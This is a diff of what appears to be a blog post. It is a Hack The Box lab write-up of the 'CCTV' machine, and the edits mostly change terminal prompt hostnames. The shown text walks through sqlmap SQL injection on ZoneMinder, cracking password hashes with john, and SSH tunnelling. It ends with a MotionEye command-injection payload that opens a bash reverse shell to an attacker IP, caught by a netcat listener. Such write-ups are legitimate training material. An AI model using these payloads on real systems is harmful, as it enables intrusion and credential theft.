@@ -1,6 +1,7 @@
 +++
 title = "CCTV - Exploiting outdated services with SQL injection"
 date = 2026-05-15T16:20:18Z
+difficulty = "easy"
 tags = ["HTB - Easy", "Linux", "Pentesting"]
 description = "Pwning the CCTV machine from HTB."
 +++
@@ -9,7 +10,7 @@ description = "Pwning the CCTV machine from HTB."
 ## **RECON**
 After obtaining the target machine's IP address, I ran an nmap scan to identify open TCP ports:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nmap -sS -oN nmap_scan.txt 10.129.7.141                     
 ```
 The scan revealed two open TCP ports for SSH and HTTP (a stealth scan was necessary to stop the machine from crashing).
@@ -48,14 +49,14 @@ sqlmap -u http://hostname_or_ip/zm/index.php?view=request&request=event&action=r
 ```
 I modified the command for my target machine, and also added a **cookie** flag to use the **ZoneMinder session ID** from my unprivileged account. I targeted the **zm** database and **Users** table and dumped the data to my attacking machine:  
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
 --cookie "ZMSESSID=5hbje44ebg6n3n0s61f0bhbr6a" \
 -D zm -T Users --dump
 ```
 The output got saved into a **Users.csv** file, which contained the following credentials:  
 ```bash
-┌──(root㉿kali)-[~/…/output/cctv.htb/dump/zm]
+┌──(root㉿pangelinan)-[~/…/output/cctv.htb/dump/zm]
 └─# cat Users.csv
 Username,Password
 superadmin,$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
@@ -66,7 +67,7 @@ All I had to do now was crack the password hashes!
 &nbsp;  
 The format of the hashes were bcrypt, with a cost factor of 10. I attempted to crack them using the **john the ripper** tool and the **rockyou.txt** password list:
 ```bash
-──(root㉿kali)-[/home/esteban/HackTheBox]
+──(root㉿pangelinan)-[~/HackTheBox]
 └─# john hash.txt --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
@@ -81,7 +82,7 @@ Session completed.
 The cracked password above is for the user **mark**, whose password I attempted to crack first. Trying to run john against the **superadmin** user went on for way too long, so I gave up on trying to crack that and instead used the **mark** user to SSH into the target machine.  
 ## **FOOTHOLD**
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# ssh mark@cctv.htb
 mark@cctv.htb's password: 
 Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)
@@ -146,7 +147,7 @@ As it turns out, this port is commonly used by the **MotionEye** service, a loca
 &nbsp;  
 I went back to my attacker machine's terminal and used SSH to tunnel a connection from the target machine to my own:  
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# ssh -L 9999:127.0.0.1:8765 mark@cctv.htb
 ```
 I was then able to visit the **MotionEye** panel by opening up a web browser and navigating to **http://localhost:9999**
@@ -202,7 +203,7 @@ $(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.16.192/44
 ## **PRIVESC**  
 All that was left to do was set up a listener on my target machine:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nc -lvnp 4444  
 listening on [any] 4444 ...
 ```
@@ -210,7 +211,7 @@ Then, hit **Apply** on the MotionEye admin panel:
 ![hitting apply on the motioneye admin panel](/images/cctv/apply.png)
 After that, the rest was history.  
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nc -lvnp 4444  
 listening on [any] 4444 ...
 connect to [10.10.16.192] from (UNKNOWN) [10.129.9.47] 40052
